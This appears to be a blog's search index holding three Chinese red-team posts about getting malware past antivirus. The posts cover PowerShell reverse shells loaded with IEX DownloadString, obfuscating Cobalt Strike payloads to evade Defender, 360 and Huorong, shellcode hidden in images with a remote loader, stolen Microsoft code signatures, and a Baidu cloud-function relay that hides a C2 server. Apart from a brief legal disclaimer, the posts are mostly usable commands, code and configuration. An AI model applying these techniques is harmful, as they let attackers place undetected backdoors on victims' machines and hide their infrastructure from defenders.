<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>Powershell免杀上线</title>
    <link href="/2025/09/01/Powershell%E5%85%8D%E6%9D%80%E4%B8%8A%E7%BA%BF/"/>
    <url>/2025/09/01/Powershell%E5%85%8D%E6%9D%80%E4%B8%8A%E7%BA%BF/</url>
    
    <content type="html"><![CDATA[<p>从反弹shell到木马免杀上线cobalt strike</p><h1 id="声明："><a href="#声明：" class="headerlink" title="声明："></a>声明：</h1><p>​本文仅用于学习交流和技术分享，文中所涉及到的任何技术均不得用于任何非法网络活动和未经授权的测试！</p><h1 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h1><p>​相信很多红队师傅都做过免杀，因为免杀是后渗透和权限维持的基础。但是一般cobalt strike或者MSF生成的木马都被各大杀软厂商记录了特征，露头就秒属于是。而加载器加载shellcode对编程能力和对杀软的理解要求较高（可能是我菜，写的加载器太捞了）。既然加载shellcode太难了，所以笔者另辟蹊径，分享一种通过powershell脚本实现反弹shell的上线方式，通过对脚本和命令的免杀处理来实现目标机器上线。</p><h1 id="0x01-脚本功能测试"><a href="#0x01-脚本功能测试" class="headerlink" title="0x01 脚本功能测试"></a>0x01 脚本功能测试</h1><p>项目地址：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/samratashok/</span>nishang<br>https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/shakenetwork/</span>nishang<span class="hljs-regexp">/blob/m</span>aster<span class="hljs-regexp">/Shells/</span>Invoke-PowerShellTcp.ps1<br></code></pre></td></tr></table></figure><p>此脚本基于Tcp协议，可实现正反向shell连接，创建交互式会话。</p><h2 id="远程加载"><a href="#远程加载" class="headerlink" title="远程加载"></a>远程加载</h2><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs arcade"><span class="hljs-comment">//注意区别web服务端口和tcp连接端口</span><br>IEX (<span class="hljs-keyword">New</span>-Object Net.WebClient).DownloadString(<span class="hljs-string">&#x27;http://ip:port/Invoke-PowerShellTcp.ps1&#x27;</span>);Invoke-PowerShellTcp -<span class="hljs-built_in">Reverse</span> -IPAddress ip -port <span class="hljs-number">7777</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Suneanist/tuchuang@main/img/image-20250826113703091.png" alt="image-20250826113703091"></p><h2 id="本地加载"><a href="#本地加载" class="headerlink" title="本地加载"></a>本地加载</h2><figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs mathematica"><span class="hljs-operator">//</span>在脚本根目录执行<br><span class="hljs-variable">IEX</span> <span class="hljs-punctuation">(</span><span class="hljs-built_in">Get</span><span class="hljs-operator">-</span><span class="hljs-variable">Content</span> <span class="hljs-operator">-</span><span class="hljs-built_in">Path</span> <span class="hljs-operator">.</span>\<span class="hljs-variable">Invoke</span><span class="hljs-operator">-</span><span class="hljs-variable">PowerShellTcp</span><span class="hljs-operator">.</span><span class="hljs-variable">ps1</span> <span class="hljs-operator">-</span><span class="hljs-variable">Raw</span><span class="hljs-punctuation">)</span><span class="hljs-operator">;</span> <span class="hljs-variable">Invoke</span><span class="hljs-operator">-</span><span class="hljs-variable">PowerShellTcp</span> <span class="hljs-operator">-</span><span class="hljs-built_in">Reverse</span> <span class="hljs-operator">-</span><span class="hljs-built_in">IPAddress</span> <span class="hljs-variable">ip</span> <span class="hljs-operator">-</span><span class="hljs-variable">Port</span> <span class="hljs-number">7777</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Suneanist/tuchuang@main/img/image-20250826114233363.png" alt="image-20250826114233363"></p><p>远程加载和本地加载均可正常执行，但是都过不了杀软。这个项目是几年前发布的，特征早就被各大安全厂商记录了，所以原脚本被杀很正常。</p><p><img src="https://cdn.jsdelivr.net/gh/Suneanist/tuchuang@main/img/image-20250826114824621.png" alt="image-20250826114824621"></p><h1 id="0x02-免杀测试"><a href="#0x02-免杀测试" class="headerlink" title="0x02 免杀测试"></a>0x02 免杀测试</h1><p>由于杀软已经记录了脚本的特征，再加上其本身的一些恶意行为，导致原脚本基本无法正常使用。</p><p>笔者将一步步进行改进，尝试绕过杀软！</p><h2 id="加密与分离加载"><a href="#加密与分离加载" class="headerlink" title="加密与分离加载"></a>加密与分离加载</h2><p>这里加密框架使用的是Invoke-Obfuscation，这个工具也是比较老的，但是它可以实现powershell命令或函数的重叠加密</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs elixir">项目地址<span class="hljs-symbol">:https</span><span class="hljs-symbol">://github</span>.com/danielbohannon/<span class="hljs-title class_">Invoke</span>-<span class="hljs-title class_">Obfuscation</span><br></code></pre></td></tr></table></figure><p>使用Invoke-Obfuscation对执行命令和原脚本进行加密，详细命令参数不做赘述，可以参考项目使用文档。</p><p><img src="https://cdn.jsdelivr.net/gh/Suneanist/tuchuang@main/img/image-20250827105456410.png" alt="image-20250827105456410"></p><p>生成加密脚本encode_test.ps1后，测试功能（本地加载即可）</p><figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mathematica"><span class="hljs-variable">IEX</span> <span class="hljs-punctuation">(</span><span class="hljs-built_in">Get</span><span class="hljs-operator">-</span><span class="hljs-variable">Content</span> <span class="hljs-operator">-</span><span class="hljs-built_in">Path</span> <span class="hljs-operator">.</span>\<span class="hljs-variable">Invoke</span><span class="hljs-operator">-</span><span class="hljs-variable">PowerShellTcp</span><span class="hljs-operator">.</span><span class="hljs-variable">ps1</span> <span class="hljs-operator">-</span><span class="hljs-variable">Raw</span><span class="hljs-punctuation">)</span><span class="hljs-operator">;</span> <span class="hljs-variable">Invoke</span><span class="hljs-operator">-</span><span class="hljs-variable">PowerShellTcp</span> <span class="hljs-operator">-</span><span class="hljs-built_in">Reverse</span> <span class="hljs-operator">-</span><span class="hljs-built_in">IPAddress</span> <span class="hljs-variable">ip</span> <span class="hljs-operator">-</span><span class="hljs-variable">Port</span> <span class="hljs-number">7777</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Suneanist/tuchuang@main/img/image-20250827105829806.png" alt="image-20250827105829806"></p><p>功能没问题，接下来测试免杀效果</p><h3 id="火绒安全"><a href="#火绒安全" class="headerlink" title="火绒安全"></a>火绒安全</h3><p><img src="https://cdn.jsdelivr.net/gh/Suneanist/tuchuang@main/img/image-20250827110952209.png" alt="image-20250827110952209"></p><p>火绒动静态全过，这里应该有点运气成分，笔者在前几次测试中动态是过不了火绒的。每次加密的参数都是随机的，火绒主要是检查文件内容，一般会报代码混淆器，这次不知道为啥没查出来，有点离谱直接过了。</p><h3 id="360安全"><a href="#360安全" class="headerlink" title="360安全"></a>360安全</h3><p><img src="https://cdn.jsdelivr.net/gh/Suneanist/tuchuang@main/img/image-20250827112715471.png" alt="image-20250827112715471"></p><p>就离谱，360之前是没有过的，有点玄学了。</p><p><img src="https://cdn.jsdelivr.net/gh/Suneanist/tuchuang@main/img/image-20250827113241533.png" alt="image-20250827113241533"></p><p>这么明显的代码混淆都看不出来嘛。</p><h3 id="Defender"><a href="#Defender" class="headerlink" title="Defender"></a>Defender</h3><p>defender静态过了，动态被拦截了，国产杀软，任重道远呀。</p><p><img src="https://cdn.jsdelivr.net/gh/Suneanist/tuchuang@main/img/image-20250827114126966.png" alt="image-20250827114126966"></p><h2 id="分离免杀"><a href="#分离免杀" class="headerlink" title="分离免杀"></a>分离免杀</h2><p>分离免杀其实就是远程加载，实现脚本不落地就可以执行。这样做的好处就是减少了杀软查杀的风险。将远程加载的命令打包加密成encode_star.ps1，将加密后的脚本encode_test.ps1放入云端，让encode_star.ps1远程执行脚本。因为encode_star.ps1中只含有启动命令的加密信息，所以静态一般没问题（最多报个代码混淆，其实encode_star.ps1不用加密也行，但是这样可能会暴露vps地址，建议不加密就做云函数）。至于动态取免杀决于恶意脚本的伪装成功与否。</p><h3 id="加密启动命令"><a href="#加密启动命令" class="headerlink" title="加密启动命令"></a>加密启动命令<img src="https://cdn.jsdelivr.net/gh/Suneanist/tuchuang@main/img/image-20250828100849690.png" alt="image-20250828100849690"></h3><p>测试一下encode_star.ps1免杀效果，直接上云沙箱!</p><p><img src="https://cdn.jsdelivr.net/gh/Suneanist/tuchuang@main/img/image-20250828101147542.png" alt="image-20250828101147542"></p><p><img src="https://cdn.jsdelivr.net/gh/Suneanist/tuchuang@main/img/image-20250828101232811.png" alt="image-20250828101232811"></p><p>3kb不到能有这个效果，我已经非常满意了哈哈</p><p>encode_star.ps1启动命令：</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arduino">powershell.exe -ExecutionPolicy Bypass -NoExit -<span class="hljs-built_in">File</span> encode_star.ps1<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Suneanist/tuchuang@main/img/image-20250828101649620.png" alt="image-20250828101649620"></p><h3 id="打包exe-数字签名"><a href="#打包exe-数字签名" class="headerlink" title="打包exe+数字签名"></a>打包exe+数字签名</h3><p>为了方便执行，将encode_star.ps1打包成exe</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">powershell<span class="hljs-selector-class">.exe</span> Invoke-ps2exe .\<span class="hljs-selector-tag">source</span><span class="hljs-selector-class">.ps1</span> .\target.exe<br></code></pre></td></tr></table></figure><p>笔者这里加了微软的数字签名，过程不赘诉了，工具：SigThief-master</p><p>注意数字签名加了之后可能会有意想不到的效果，比如360检查到有数字签名，免杀效果会大幅提升。</p><p>但是defender看到用的微软的数签，免杀效果反而降低，不知道defender是不是能检测出数签是盗用的，反正我加了之后露头就秒。</p><p><img src="https://cdn.jsdelivr.net/gh/Suneanist/tuchuang@main/img/image-20250828102629633.png" alt="image-20250828102629633"></p><p>bpav.exe是没有数签版本，打包成exe后，免杀效果会有下降，这里我们的通过目标主要是defender和微步沙箱的查杀率。</p><p><img src="https://cdn.jsdelivr.net/gh/Suneanist/tuchuang@main/img/image-20250828104624257.png" alt="image-20250828104624257"></p><p><img src="https://cdn.jsdelivr.net/gh/Suneanist/tuchuang@main/img/image-20250828105052041.png" alt="image-20250828105052041"></p><p>不出意外的，没有过defender。仔细分析一下defender的报错，defender直接获取到了加密脚本解密后的函数名，由此我们可以推出，数字签名和代码加密大概率是过不了defender。</p><h3 id="脚本特征修改"><a href="#脚本特征修改" class="headerlink" title="脚本特征修改"></a>脚本特征修改</h3><p>既然代码加密和加数签这种不痛不痒的操作过不了defender，那我们只好从代码入手了。</p><p>笔者这里修改了函数名变量名和启动参数。</p><p><img src="https://cdn.jsdelivr.net/gh/Suneanist/tuchuang@main/img/image-20250828110856297.png" alt="image-20250828110856297"></p><p>用defender测试一下</p><p><img src="https://cdn.jsdelivr.net/gh/Suneanist/tuchuang@main/img/image-20250828114059095.png" alt="image-20250828114059095"></p><p>加密+打包+上云</p><p><img src="https://cdn.jsdelivr.net/gh/Suneanist/tuchuang@main/img/7b24cf659fdac10078a39d4c3286b534.png" alt="7b24cf659fdac10078a39d4c3286b534"></p><p><img src="https://cdn.jsdelivr.net/gh/Suneanist/tuchuang@main/img/7c6e9987a8e880483c9d141bac707f65.png" alt="7c6e9987a8e880483c9d141bac707f65"></p><p>效果还不错。</p><h1 id="0x03-免杀Cobalt-Strick木马"><a href="#0x03-免杀Cobalt-Strick木马" class="headerlink" title="0x03 免杀Cobalt Strick木马"></a>0x03 免杀Cobalt Strick木马</h1><p>这里笔者用的是cs4.9中的powershell payload64位生成器</p><p>生成的木马文件为ps1文件，其中包含必要的上线机器码和其他必要的函数代码</p><p><img src="https://cdn.jsdelivr.net/gh/Suneanist/tuchuang@main/img/image-20250901173610562.png" alt="image-20250901173610562"></p><p>同样的，机器码动不了，那就改其他函数。笔者这里借助了ai辅助修改代码</p><p>这里笔者也没少被defender折磨，改了一下午才过。大概思路就是字符串拼接+混淆+垃圾代码，部分代码截图如下：</p><p><img src="https://cdn.jsdelivr.net/gh/Suneanist/tuchuang@main/img/image-20250901173953276.png" alt="image-20250901173953276"></p><p>当defender不再杀木马源文件了就说明达到效果了（笔者在测试过程中发现defender不杀了，但是火绒会杀，所以还得用上面的加密）</p><p>为了让我们的木马实现通杀，那就使用我们上述的方法，加密+打包+加数签+上云实现分离加载，最终效果截图如下：</p><p><img src="https://cdn.jsdelivr.net/gh/Suneanist/tuchuang@main/img/5bd80daa12aaf743e7a91a26e2c97302.png" alt="5bd80daa12aaf743e7a91a26e2c97302"></p><p><img src="https://cdn.jsdelivr.net/gh/Suneanist/tuchuang@main/img/47e090ee7c0da308df907180d222e17a.png" alt="47e090ee7c0da308df907180d222e17a"></p><p><img src="https://cdn.jsdelivr.net/gh/Suneanist/tuchuang@main/img/image-20250901174656486.png" alt="image-20250901174656486"></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Powershell免杀学习</title>
    <link href="/2025/08/22/ps%E5%85%8D%E6%9D%80%E5%AD%A6%E4%B9%A0/"/>
    <url>/2025/08/22/ps%E5%85%8D%E6%9D%80%E5%AD%A6%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<p>利用powershell加载shellcode实现木马免杀</p><h2 id="1、将shellcode写入图片"><a href="#1、将shellcode写入图片" class="headerlink" title="1、将shellcode写入图片"></a>1、将shellcode写入图片</h2><p>工具：Invoke-PSImage-master</p><p><a href="https://github.com/peewpw/Invoke-PSImage">https://github.com/peewpw/Invoke-PSImage</a></p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs stylus">Set-ExecutionPolicy Unrestricted -Scope CurrentUser<br><span class="hljs-comment">//设置执行策略</span><br>Import-Module .\Invoke-PSImage<span class="hljs-selector-class">.ps1</span><br><span class="hljs-comment">//导入目标脚本文件</span><br>Invoke-PSImage -Script .\payload<span class="hljs-selector-class">.ps1</span> -Image .\<span class="hljs-selector-tag">img</span><span class="hljs-selector-class">.png</span> -Out .\payload<span class="hljs-selector-class">.jpg</span> -Web <br><span class="hljs-comment">//payload.ps1原生shellcode。img.png是有普通图片。payload.jpg是生成的带有shellcode的图片</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Suneanist/tuchuang@main/img/image-20250529145416449.png" alt="image-20250529145416449"></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">sal</span> a <span class="hljs-built_in">New-Object</span>;<span class="hljs-built_in">Add-Type</span> <span class="hljs-literal">-A</span> System.Drawing;<span class="hljs-variable">$g</span>=a System.Drawing.Bitmap((a Net.WebClient).OpenRead(<span class="hljs-string">&quot;http://example.com/test2.png&quot;</span>));<span class="hljs-variable">$o</span>=a Byte[] <span class="hljs-number">3600</span>;(<span class="hljs-number">0</span>..<span class="hljs-number">19</span>)|%&#123;<span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$x</span> <span class="hljs-keyword">in</span>(<span class="hljs-number">0</span>..<span class="hljs-number">179</span>))&#123;<span class="hljs-variable">$p</span>=<span class="hljs-variable">$g</span>.GetPixel(<span class="hljs-variable">$x</span>,<span class="hljs-variable">$_</span>);<span class="hljs-variable">$o</span>[<span class="hljs-variable">$_</span>*<span class="hljs-number">180</span>+<span class="hljs-variable">$x</span>]=([<span class="hljs-type">math</span>]::Floor((<span class="hljs-variable">$p</span>.B<span class="hljs-literal">-band15</span>)*<span class="hljs-number">16</span>)<span class="hljs-operator">-bor</span>(<span class="hljs-variable">$p</span>.G <span class="hljs-operator">-band</span> <span class="hljs-number">15</span>))&#125;&#125;;<span class="hljs-built_in">IEX</span>([<span class="hljs-type">System.Text.Encoding</span>]::ASCII.GetString(<span class="hljs-variable">$o</span>[<span class="hljs-number">0</span><span class="hljs-type">..3554</span>]))<br><br>//生成执行命令，将payload.jpg放入vps，然后将图片地址替换执行命令中的<span class="hljs-string">&quot;http://example.com/test2.png&quot;</span><br></code></pre></td></tr></table></figure><h2 id="2、加密执行命令"><a href="#2、加密执行命令" class="headerlink" title="2、加密执行命令"></a>2、加密执行命令</h2><p>使用Invoke-Obfuscation-master进行加密</p><h3 id="使用工具"><a href="#使用工具" class="headerlink" title="使用工具"></a>使用工具</h3><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/danielbohannon/</span>Invoke-Obfuscation<br></code></pre></td></tr></table></figure><p>进入Invoke-Obfuscation-master目录后使用ps执行</p><figure class="highlight dsconfig"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs dsconfig"><span class="hljs-built_in">set-ExecutionPolicy</span> <span class="hljs-string">RemoteSigned</span><br><span class="hljs-string">Y</span><br>//报错就执行上述命令， 管理员权限<br></code></pre></td></tr></table></figure><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">Import-Module</span> .\<span class="hljs-built_in">Invoke-Obfuscation</span>.psd1; <span class="hljs-built_in">Invoke-Obfuscation</span><br><span class="hljs-built_in">set</span> scriptpath payload.ps1    //执行指定待处理的Ps1文件<br></code></pre></td></tr></table></figure><p>选择操作类型：比如选择加密，此工具的优势就是可以进行多次加密叠加</p><p>输出加密后的文件：out+path+filename</p><p>例如：D:\Invoke-Obfuscation-master\ps\shell.ps1</p><h3 id="靶机执行"><a href="#靶机执行" class="headerlink" title="靶机执行"></a>靶机执行</h3><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stata">powershell.exe -ExecutionPolicy Bypass -NoExit -<span class="hljs-keyword">File</span> <span class="hljs-keyword">shell</span>.ps1<br></code></pre></td></tr></table></figure><p>将ps1打包成exe</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stylus">Install-Module ps2exe   <span class="hljs-comment">//在powershell执行命令，注意要是管理员权限</span><br>Invoke-ps2exe .\<span class="hljs-selector-tag">source</span><span class="hljs-selector-class">.ps1</span> .\target<span class="hljs-selector-class">.exe</span>    <span class="hljs-comment">//将ps1文件编译成exe</span><br></code></pre></td></tr></table></figure><h2 id="3、加入数字签名"><a href="#3、加入数字签名" class="headerlink" title="3、加入数字签名"></a>3、加入数字签名</h2><p>工具：SigThief-master</p><p><a href="https://github.com/secretsquirrel/SigThief">https://github.com/secretsquirrel/SigThief</a></p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">python</span> sigthief.<span class="hljs-keyword">py</span> -i msedge.<span class="hljs-keyword">exe</span> -t payload.<span class="hljs-keyword">exe</span> -<span class="hljs-keyword">o</span> test.<span class="hljs-keyword">exe</span><br>// msedge.<span class="hljs-keyword">exe</span>是含有数字签名的程序，payload.<span class="hljs-keyword">exe</span>是需要数字签名程序，test.<span class="hljs-keyword">exe</span>是输出的含有数字签名的程序<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>百度云函数实现c2服务器地址隐藏</title>
    <link href="/2025/08/22/%E7%99%BE%E5%BA%A6%E4%BA%91%E5%87%BD%E6%95%B0%E9%85%8D%E7%BD%AE/"/>
    <url>/2025/08/22/%E7%99%BE%E5%BA%A6%E4%BA%91%E5%87%BD%E6%95%B0%E9%85%8D%E7%BD%AE/</url>
    
    <content type="html"><![CDATA[<p>在护网中，c2服务器对红队师傅来说至关重要，但是在攻防过程中c2服务器难免与目标直接交互留下痕迹。这里我们通过云函数来避免vps地址被蓝队溯源</p><h2 id="1、注册进入百度云搜索云函数"><a href="#1、注册进入百度云搜索云函数" class="headerlink" title="1、注册进入百度云搜索云函数"></a>1、注册进入百度云搜索云函数</h2><p>创建函数，编辑好必要信息之后点下一步</p><p><img src="https://cdn.jsdelivr.net/gh/Suneanist/tuchuang@main/img/image-20250603110740297.png" alt="image-20250603110740297"></p><p>运行时环境此处必须选择python3.6，否则后面的脚本无法运行</p><p><img src="https://cdn.jsdelivr.net/gh/Suneanist/tuchuang@main/img/image-20250603111022560.png" alt="image-20250603111022560"></p><h2 id="2、进入代码编辑页"><a href="#2、进入代码编辑页" class="headerlink" title="2、进入代码编辑页"></a>2、进入代码编辑页</h2><p><img src="https://cdn.jsdelivr.net/gh/Suneanist/tuchuang@main/img/image-20250603111411146.png" alt="image-20250603111411146"></p><p>将代码贴上特别注意在C2变量中需要填写自己vps的信息，建议使用http协议，以及自定义端口，如有特别需求也可以更改编码方式</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br> <br><span class="hljs-comment"># def handler(event, context): </span><br><span class="hljs-comment">#     return &quot;Hello World&quot;</span><br>import json,requests,base64<br>def handler(event, context):<br>    <span class="hljs-attribute">C2</span>=<span class="hljs-string">&#x27;https://xxxx:443&#x27;</span># 这里可以使用 HTTP、HTTPS~下角标~   <br>    <span class="hljs-attribute">path</span>=event[<span class="hljs-string">&#x27;path&#x27;</span>]<br>    <span class="hljs-attribute">headers</span>=event[<span class="hljs-string">&#x27;headers&#x27;</span>]<br>    <span class="hljs-built_in">print</span>(event)<br>    <span class="hljs-keyword">if</span> event[<span class="hljs-string">&#x27;httpMethod&#x27;</span>] == <span class="hljs-string">&#x27;GET&#x27;</span> :<br>        <span class="hljs-attribute">resp</span>=requests.get(C2+path,headers=headers,verify=False)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-attribute">resp</span>=requests.post(C2+path,data=event[<span class="hljs-string">&#x27;body&#x27;</span>],<span class="hljs-attribute">headers</span>=headers,verify=False)<br>    <span class="hljs-built_in">print</span>(resp.headers)<br>    <span class="hljs-built_in">print</span>(resp.content)<br>    response=&#123;<br>    <span class="hljs-string">&quot;isBase64Encoded&quot;</span>: <span class="hljs-literal">True</span>,<br>    <span class="hljs-string">&quot;statusCode&quot;</span>: resp.status_code,<br>    <span class="hljs-string">&quot;headers&quot;</span>: dict(resp.headers),<br>    <span class="hljs-string">&quot;body&quot;</span>: str(base64.b64encode(resp.content))[2:-1]<br>    &#125;<br>    #return event<br>    return response<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Suneanist/tuchuang@main/img/image-20250603111509971.png" alt="image-20250603111509971"></p><h2 id="3、新增触发器"><a href="#3、新增触发器" class="headerlink" title="3、新增触发器"></a>3、新增触发器</h2><p>选择http触发器</p><p><img src="https://cdn.jsdelivr.net/gh/Suneanist/tuchuang@main/img/image-20250603111921985.png" alt="image-20250603111921985"></p><p><img src="https://cdn.jsdelivr.net/gh/Suneanist/tuchuang@main/img/image-20250603112007172.png" alt="image-20250603112007172"></p><p><img src="https://cdn.jsdelivr.net/gh/Suneanist/tuchuang@main/img/image-20250603112313063.png" alt="image-20250603112313063"></p><p>云函数生成的随机域名</p><p><img src="https://cdn.jsdelivr.net/gh/Suneanist/tuchuang@main/img/image-20250603112604714.png" alt="image-20250603112604714"></p><h2 id="4、编写cs配置文件"><a href="#4、编写cs配置文件" class="headerlink" title="4、编写cs配置文件"></a>4、编写cs配置文件</h2><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs abnf">http-get &#123;<br> <br>  set uri <span class="hljs-string">&quot;/api/x&quot;</span><span class="hljs-comment">;</span><br> <br>  client &#123;<br>      header <span class="hljs-string">&quot;Accept&quot;</span> <span class="hljs-string">&quot;*/*&quot;</span><span class="hljs-comment">;</span><br>      metadata &#123;<br>          base64<span class="hljs-comment">;</span><br>          prepend <span class="hljs-string">&quot;SESSIONID=&quot;</span><span class="hljs-comment">;</span><br>          header <span class="hljs-string">&quot;Cookie&quot;</span><span class="hljs-comment">;</span><br>      &#125;<br>  &#125;<br> <br>  server &#123;<br>      header <span class="hljs-string">&quot;Content-Type&quot;</span> <span class="hljs-string">&quot;application/ocsp-response&quot;</span><span class="hljs-comment">;</span><br>      header <span class="hljs-string">&quot;content-transfer-encoding&quot;</span> <span class="hljs-string">&quot;binary&quot;</span><span class="hljs-comment">;</span><br>      header <span class="hljs-string">&quot;Server&quot;</span> <span class="hljs-string">&quot;Nodejs&quot;</span><span class="hljs-comment">;</span><br>      output &#123;<br>          base64<span class="hljs-comment">;</span><br>          print<span class="hljs-comment">;</span><br>      &#125;<br>  &#125;<br>&#125;<br>http-stager &#123;<br>  set uri_x86 <span class="hljs-string">&quot;/vue.min.js&quot;</span><span class="hljs-comment">;</span><br>  set uri_x64 <span class="hljs-string">&quot;/bootstrap-2.min.js&quot;</span><span class="hljs-comment">;</span><br>&#125;<br>http-post &#123;<br>  set uri <span class="hljs-string">&quot;/api/y&quot;</span><span class="hljs-comment">;</span><br>  client &#123;<br>      header <span class="hljs-string">&quot;Accept&quot;</span> <span class="hljs-string">&quot;*/*&quot;</span><span class="hljs-comment">;</span><br>      id &#123;<br>          base64<span class="hljs-comment">;</span><br>          prepend <span class="hljs-string">&quot;JSESSION=&quot;</span><span class="hljs-comment">;</span><br>          header <span class="hljs-string">&quot;Cookie&quot;</span><span class="hljs-comment">;</span><br>      &#125;<br>      output &#123;<br>          base64<span class="hljs-comment">;</span><br>          print<span class="hljs-comment">;</span><br>      &#125;<br>  &#125;<br> <br>  server &#123;<br>      header <span class="hljs-string">&quot;Content-Type&quot;</span> <span class="hljs-string">&quot;application/ocsp-response&quot;</span><span class="hljs-comment">;</span><br>      header <span class="hljs-string">&quot;content-transfer-encoding&quot;</span> <span class="hljs-string">&quot;binary&quot;</span><span class="hljs-comment">;</span><br>      header <span class="hljs-string">&quot;Connection&quot;</span> <span class="hljs-string">&quot;keep-alive&quot;</span><span class="hljs-comment">;</span><br>      output &#123;<br>          base64<span class="hljs-comment">;</span><br>          print<span class="hljs-comment">;</span><br>      &#125;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>保存为baidu.profile</p><p>cs启动命令为：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">./teamserver vps <span class="hljs-built_in">pwd</span> baidu.profile<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Suneanist/tuchuang@main/img/image-20250603112846828.png" alt="image-20250603112846828"></p><p>添加监听器准备上线！</p>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
